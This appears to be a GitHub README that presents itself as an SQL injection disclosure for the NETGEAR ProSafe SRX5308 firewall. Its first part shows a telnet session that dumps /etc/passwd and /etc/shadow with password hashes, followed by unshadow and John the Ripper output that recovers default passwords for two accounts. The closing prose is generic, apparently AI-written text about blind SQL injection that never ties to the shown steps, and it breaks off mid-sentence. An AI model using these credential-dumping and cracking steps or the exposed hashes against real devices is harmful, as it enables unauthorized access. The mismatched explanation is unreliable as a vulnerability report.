# NETGEAR-ProSafe-Gigabit-Quad-WAN-SSL-VPN-Firewall-SRX5308 SQL Injection Vulnerability

<img src="https://raw.githubusercontent.com/0x01369/NETGEAR-ProSafe-Gigabit-Quad-WAN-SSL-VPN-Firewall-SRX5308/main/images.jpg" class="shrinkToFit" width="700" height="284">

<img src="https://raw.githubusercontent.com/0x01369/NETGEAR-ProSafe-Gigabit-Quad-WAN-SSL-VPN-Firewall-SRX5308/main/images.png" class="shrinkToFit" width="700" height="284">

* The NETGEAR ProSAFE SRX5308 Quad WAN Gigabit SSL VPN Firewall is perfect for even the most demanding business networks. The SRX5308 features a hardware-* accelerated data flow architecture that allows for 1 Gbps of stateful firewall throughput.

* telnet 192.168.1.2 520

* cat /etc/passwd

root:x:0:0:root:/root:/bin/sh
nobody:x:0:0:nobody:/nonexistent:/bin/false
showid:1lBVM0/fM8rqk:0:0:sid:/:/pfrm2.0/bin/showid.sh
admin:x:0:2:Linux User,,,:/home/admin:/pfrm2.0/bin/platform.cli
guest:x:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli

* cat /etc/shadow

daemon:*:13189:0:99999:7:::
root:CxqJynrkPOtP.:12374:0:99999:7:::
admin:m1LVojhaR1U5Y:11582:0:99999:7:::
guest:K7Vjga.vILkVA:11582:0:99999:7:::

* root@kali:~$ unshadow /home/root/Desktop/passwd /home/root/Desktop/shadow > /home/root/Desktop/status

root:CxqJynrkPOtP.:0:0:root:/root:/bin/sh
nobody:x:0:0:nobody:/nonexistent:/bin/false
showid:1lBVM0/fM8rqk:0:0:sid:/:/pfrm2.0/bin/showid.sh
admin:m1LVojhaR1U5Y:0:2:Linux User,,,:/home/admin:/pfrm2.0/bin/platform.cli
guest:K7Vjga.vILkVA:0:1000:Linux User,,,:/home/guest:/pfrm2.0/bin/platform.cli

* root@kali:~$ john /home/root/Desktop/status

* Loaded 2 password hashes with 2 different salts (descrypt, traditional crypt(3) [DES 128/128 SSE2])

* Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist

* password (showid)

* password (guest)

I can provide you with an overview of a boolean-based blind SQL injection vulnerability on the login page of the NETGEAR ProSafe™ Gigabit Quad WAN SSL VPN Firewall SRX5308.

SQL injection is a type of vulnerability that occurs when a malicious user is able to input untrusted data into an application's SQL query, allowing them to execute arbitrary SQL commands on the database. Boolean-based blind SQL injection is a type of SQL injection that allows an attacker to determine the truth of a statement by injecting specific inputs and observing the response.

In the case of the NETGEAR ProSafe™ Gigabit Quad WAN SSL VPN Firewall SRX5308, the vulnerability exists on the login page, where the device's authentication mechanism is vulnerable to a boolean-based blind SQL injection attack. An attacker could exploit this vulnerability by injecting malicious SQL code into the login form's fields, such as the username or password field, and observing the response from the device.

The attacker could use this vulnerability to extract sensitive information from the device's database, such as user credentials, and even gain complete control over the device. It could also allow an attacker to access the internal network behind the firewall and potentially compromise other devices on the network.

To prevent this vulnerability, it is important to keep the device updated with the latest security patches and to properly validate user input on the login page. It is also important to monitor the device's logs for any suspicious activity and to use a strong and unique password for the device's administrator account.

It's important to note that this vulnerability may have been already fixed by the manufacturer and if you are using this device, it's important to contact NETGEAR for a patch or a solution for this





